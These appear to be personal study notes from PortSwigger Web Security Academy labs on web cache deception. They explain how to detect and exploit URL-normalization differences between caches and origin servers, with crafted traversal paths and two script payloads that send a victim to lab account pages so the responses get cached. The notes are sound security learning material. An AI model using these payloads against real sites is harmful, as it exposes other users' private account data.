# Normalization discrepancies

Involves converting URL paths into a standard format. Decoding and resolving dot-segments.

`/static/..%2fprofile`
* Origin server that decodes `/` chars and resolves dot-segments would normalize `/profile`.
* A cache not resolving these chars, would resolve `/static/..%2fprofile`. If cache stores responses from `/static` prefix, it would cache and serve profile info.

An exploitable normalization discrepancy requires that either the cache or origin server decodes characters in the path traversal sequence as well as resolving dot-segments.

## Detecting normalization by the origin server

Send request to a non-cacheable resource, look for non-idempotent method like POST.

### Example:

modify `/profile` to `/aaa/..%2fprofile`
* If response matches, the path is interpreted as `/profile`. Origin, decodes `/` and resolves dot-segment.
* If doesn't match, for ex with a 404 error, path is interpreted as `/aaa/..%2fprofile`.

Note: can start encoding the `/`, some CDNs match the `/` following the static dir prefix. Can also encode full path traversal, or a dot instead of `/`.

## Detecting normalization by the cache server

Start identifying static directories, check in burp history common static dirs and cached responses. Filter 2xx responses, and script, imgs, CSS MIME types.

Chose a request and send with path traversal and arbitrary dir at the start.

`/aaa/..%2fassets/js/stockCheck.js`
* If response is not cached, then not normalizing. There is a cache rule based on `/assets`
* If cached, path is normalized to `/assets/js/stockCheck.js`

Can also add path traversal after directory prefix.
`/assets/aaa/..%2fjs/stockCheck.js`
* If response is not cached, then cache decodes `/` and resolves dot-segment during normalization, interpreting path as `/js/stockCheck.js`. Rule based on `/assets`
* If response is cached, then hasn't decoded `/` or resolved dot-segment, interpreting path as `/assets/..%2fjs/stockCheck.js`

On both cases, response may be cached due to another cache rule, such as file extension. To confirm, can add arbitrary string after the dir prefix. Ex: `/assets/aaa`

## Exploiting normalization by the origin server

If the origin server resolves encoded dot-segments, but cache doesn't, can exploit it:

`/<static-directory-prefix>/..%2f<dynamic-path>`

`/assets/..%2fprofile`

The cache interprets the path as: `/assets/..%2fprofile`
The origin server interprets the path as: `/profile`

The origin server returns the dynamic profile information, which is stored in the cache.

### Example:

Detecting normalization by the origin server:

`/aaa/..%2fmy-account`

Detecting normalization by the cache server:

`/resources/aaa/..%2flabheader/js/labHeader.js`  gets a hit after repeating

Exploiting normalization by the origin server:

`/resources/..%2fmy-account`

`<script>document.location="https://0a11001904f048b1802b0dc300780045.web-security-academy.net/resources/..%2fmy-account"</script>`

## Exploiting normalization by the cache server

If cached server resolves encoded dot-segments but the origin server doesn't, can exploit:

`/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>`

Need to encode all characters

Path trabversal isn't suficient. 

`/profile%2f%2e%2e%2fstatic`
* The cache interprets path `/static`
* The origin server interprets path as /profile%2f%2e%2e%2fstatic

To exploit, need to identify a delimiter used by the origin but not the cache. Test delimiters after the dynamic path:
* If origin server uses delimiter, will truncate URL path and return dynamic info
* If cache doesn't use delimiter, will resolve path and cache response

### Example:

`/profile;%2f%2e%2e%2fstatic`		Origin server uses ; as delimiter
* Cache interprets path as `/static`
* Origin inteprets path as `/profile`

Origin server returns the dynamic profile info stored in cache.

### Example:

Finding delimiters on server and cache (`/my-account` and `/resources`) got `#`, `?`, `%23` and `%3f`

Has a rule to cache based on `/resources` prefix.
`/my-account?%2f%2e%2e%2fresources`

`<script>document.location="https://0a4a009604071e4a80663a69004f00d0.web-security-academy.net/my-account%23%2f%2e%2e%2fresources"</script>`
